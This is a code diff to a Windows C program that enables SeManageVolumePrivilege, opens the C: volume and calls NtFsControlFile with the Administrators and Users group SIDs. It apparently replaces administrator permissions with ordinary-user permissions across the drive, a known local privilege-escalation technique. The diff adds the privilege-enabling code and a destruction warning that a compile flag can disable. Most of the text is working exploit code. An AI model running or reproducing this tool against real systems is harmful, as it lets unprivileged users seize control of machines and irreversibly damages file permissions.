@@ -8,19 +8,18 @@
 #define QUAD_ALIGN(P) (((P) + 7) & (-8))
 #define Add2Ptr(Ptr,Inc) ((PVOID)((PUCHAR)(Ptr) + (Inc)))
 #define STATUS_SUCCESS 0
-#define STATUS_ACCESS_DENIED (NTSTATUS)0xc0000022
 
 __kernel_entry NTSYSCALLAPI NTSTATUS NtFsControlFile(
-	HANDLE           FileHandle,
-	HANDLE           Event,
-	PIO_APC_ROUTINE  ApcRoutine,
-	PVOID            ApcContext,
+	HANDLE FileHandle,
+	HANDLE Event,
+	PIO_APC_ROUTINE ApcRoutine,
+	PVOID ApcContext,
 	PIO_STATUS_BLOCK IoStatusBlock,
-	ULONG            FsControlCode,
-	PVOID            InputBuffer,
-	ULONG            InputBufferLength,
-	PVOID            OutputBuffer,
-	ULONG            OutputBufferLength
+	ULONG FsControlCode,
+	PVOID InputBuffer,
+	ULONG InputBufferLength,
+	PVOID OutputBuffer,
+	ULONG OutputBufferLength
 );
 
 BOOL ConvertStringSidToSidW(
@@ -46,19 +45,61 @@ LPCWSTR wszOldSid = L"S-1-5-32-544";
 LPCWSTR wszNewSid = L"S-1-5-32-545";
 LPCWSTR wszVolumePath = L"\\\\.\\C:";
 
-int _tmain()
+int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 {
+#ifndef DISABLEWARNING
+	_tprintf(TEXT("\r\nThis app will irreversibly change/destroy permissions on the C: drive. \r\nPress Enter to continue, or Ctrl+C to cancel.\r\n"));
+	(void)_gettchar();
+#endif
+
+	// Try to enable SeManageVolumePrivilege, Fail if impossible, as the FSCTL will not work.
+	HANDLE hToken;
+	TOKEN_PRIVILEGES tokenPriv;
+	LUID luidDebug;
+
+	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken) != FALSE)
+	{
+		if (LookupPrivilegeValue(_T(""), SE_MANAGE_VOLUME_NAME, &luidDebug) != FALSE)
+		{
+			tokenPriv.PrivilegeCount = 1;
+			tokenPriv.Privileges[0].Luid = luidDebug;
+			tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+			if (AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(tokenPriv), NULL, NULL) != FALSE)
+			{
+				_tprintf(TEXT("Privilege enabled.\r\n"));
+			}
+			else
+			{
+				_tprintf(TEXT("Failed to enable SeManageVolumePrivilege. Check it with 'whoami /priv'.\r\n"));
+				return ERROR_PRIVILEGE_NOT_HELD;
+			}
+		}
+		else
+		{
+			_tprintf(TEXT("ERROR: LookupPrivilegeValue() failed with error code %i\r\n"), GetLastError());
+			return (int)GetLastError();
+		}
+	}
+	else
+	{
+		_tprintf(TEXT("ERROR: OpenProcessToken() failed with error code %i\r\n"), GetLastError());
+		return (int)GetLastError();
+	}
+
+	//privilege enabled, let's go
+
 	bStatus = ConvertStringSidToSidW(wszOldSid, &pSidOldSid);
 	if (!bStatus)
 	{
 		_tprintf(TEXT("ERROR: ConvertStringSidToSidW(wszOldSid) failed with error code %i\r\n"), GetLastError());
-		return GetLastError();
+		return (int)GetLastError();
 	}
 	bStatus = ConvertStringSidToSidW(wszNewSid, &pSidNewSid);
 	if (!bStatus)
 	{
 		_tprintf(TEXT("ERROR: ConvertStringSidToSidW(wszNewSid) failed with error code %i\r\n"), GetLastError());
-		return GetLastError();
+		return (int)GetLastError();
 	}
 
 	pSdInput = NULL;
@@ -92,7 +133,7 @@ int _tmain()
 
 	hVolume = CreateFile(
 		wszVolumePath,
-		 SYNCHRONIZE | FILE_TRAVERSE,
+		SYNCHRONIZE | FILE_TRAVERSE,
 		FILE_SHARE_READ | FILE_SHARE_WRITE,
 		NULL,
 		OPEN_EXISTING,
@@ -103,7 +144,7 @@ int _tmain()
 	if (INVALID_HANDLE_VALUE == hVolume)
 	{
 		_tprintf(TEXT("ERROR: CreateFile() failed with error code %i\r\n"), GetLastError());
-		return GetLastError();
+		return (int)GetLastError();
 	}
 
 	status = NtFsControlFile(
